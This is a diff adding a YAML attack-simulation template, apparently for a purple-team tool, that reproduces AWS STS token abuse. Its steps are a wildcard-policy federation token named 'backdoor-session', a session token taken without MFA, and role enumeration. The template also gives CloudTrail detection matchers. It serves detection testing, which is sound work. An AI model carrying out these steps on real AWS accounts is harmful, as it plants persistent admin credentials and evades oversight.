@@ -1,0 +1,118 @@
+id: purpleloop-sts-token-abuse
+
+info:
+  name: STS Token Abuse — Federation Endpoint Exploitation
+  author: PurpleLoop
+  severity: high
+  description: |
+    Simulates an attacker abusing STS GetFederationToken and GetSessionToken to
+    create temporary credentials that bypass MFA requirements and evade
+    session-based monitoring.  Federation tokens are particularly dangerous
+    because they can be scoped with inline policies and don't trigger the
+    same alerts as AssumeRole.
+  reference:
+    - https://attack.mitre.org/techniques/T1550/001/
+    - https://attack.mitre.org/techniques/T1528/
+  tags: aws,sts,credential-access,federation,cloudtrail
+  metadata:
+    mitre_attack:
+      tactic: "TA0006 - Credential Access"
+      technique: "T1550.001 - Use Alternate Authentication Material: Application Access Token"
+    purpleloop:
+      attack_chain: credential-access
+      variant: sts-federation
+      severity_score: 8.0
+
+attack:
+  type: aws-api
+  steps:
+    # Step 1 — Generate federation token with broad permissions
+    - action: sts:GetFederationToken
+      description: Create a federation token with inline admin policy
+      parameters:
+        Name: "backdoor-session"
+        Policy: |
+          {
+            "Version": "2012-10-17",
+            "Statement": [{
+              "Effect": "Allow",
+              "Action": "*",
+              "Resource": "*"
+            }]
+          }
+        DurationSeconds: 43200
+      delay: "{{delay_seconds}}"
+      cloudtrail_event:
+        eventName: GetFederationToken
+        eventSource: sts.amazonaws.com
+        sourceIPAddress: "{{source_ip}}"
+        userAgent: "{{user_agent}}"
+        requestParameters:
+          name: "backdoor-session"
+          durationSeconds: 43200
+        responseElements:
+          credentials:
+            accessKeyId: "ASIA{{random_hex_16}}"
+            expiration: "2024-12-31T23:59:59Z"
+          federatedUser:
+            arn: "arn:aws:sts::{{target_account}}:federated-user/backdoor-session"
+
+    # Step 2 — Get session token bypassing MFA
+    - action: sts:GetSessionToken
+      description: Generate session token without MFA
+      parameters:
+        DurationSeconds: 43200
+      delay: "{{delay_seconds}}"
+      cloudtrail_event:
+        eventName: GetSessionToken
+        eventSource: sts.amazonaws.com
+        sourceIPAddress: "{{source_ip}}"
+        userAgent: "{{user_agent}}"
+        requestParameters:
+          durationSeconds: 43200
+
+    # Step 3 — Use federation token for reconnaissance
+    - action: iam:ListRoles
+      description: Enumerate roles using the federation token
+      parameters: {}
+      delay: "{{delay_seconds}}"
+      cloudtrail_event:
+        eventName: ListRoles
+        eventSource: iam.amazonaws.com
+        sourceIPAddress: "{{source_ip}}"
+        userAgent: "{{user_agent}}"
+        userIdentity:
+          type: FederatedUser
+          arn: "arn:aws:sts::{{target_account}}:federated-user/backdoor-session"
+
+matchers:
+  - type: cloudtrail
+    name: federation-token-created
+    condition: or
+    fields:
+      - eventName == "GetFederationToken"
+      - eventName == "GetSessionToken"
+  - type: cloudtrail
+    name: wildcard-federation-policy
+    condition: and
+    fields:
+      - eventName == "GetFederationToken"
+      - requestParameters.policy contains "\"Action\": \"*\""
+
+extractors:
+  - type: json
+    name: federation-token-arn
+    json:
+      - ".responseElements.federatedUser.arn"
+  - type: json
+    name: token-duration
+    json:
+      - ".requestParameters.durationSeconds"
+
+variables:
+  delay_seconds: "2"
+  source_ip: "198.51.100.42"
+  user_agent: "Boto3/1.28.0 Python/3.11.6"
+  session_name: "red-team-sim"
+  target_account: "123456789012"
+  random_hex_16: "4645444552415445"
